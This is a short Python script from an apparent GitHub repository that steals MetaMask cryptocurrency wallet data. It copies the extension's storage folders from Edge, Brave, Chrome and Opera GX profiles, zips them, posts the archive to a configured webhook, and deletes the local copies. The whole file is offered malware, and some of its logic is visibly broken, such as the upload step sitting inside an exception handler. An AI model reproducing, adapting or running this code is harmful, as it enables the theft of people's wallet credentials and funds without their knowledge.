# #  # # # # # # # # # # # # # # # # # # #
#  GITHUB.COM/Lawxsz                     #
#                                        #
#  Credits or at least one star :)       #
#                                        #
# #  # # # # # # # # # # # # # # # # # # #

import requests, os, os.path, shutil
from config import hook

user = os.path.expanduser("~")


def make(args, brow, count):
   try:
    if os.path.exists(args):
     shutil.copytree(args, user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
     
     print(f"New Wallet found! : Total: {count}\nWallet: MetaMask_{brow}")
   except shutil.Error:
       pass
       shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
       file = {"file": open(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip", 'rb')}
       r = requests.post(hook, files=file)
       os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
       os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
def yea():
    
 meta_paths = [
   
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",               "Edge"               ],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Edge"               ],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Brave"               ],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"               "Google"               ],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "OperaGX"               ]
    ]
 count = 0
 try:
  for i in meta_paths:
   make(i[0], brow=i[1], count=count)
   count+=1
 except IndexError:
     pass
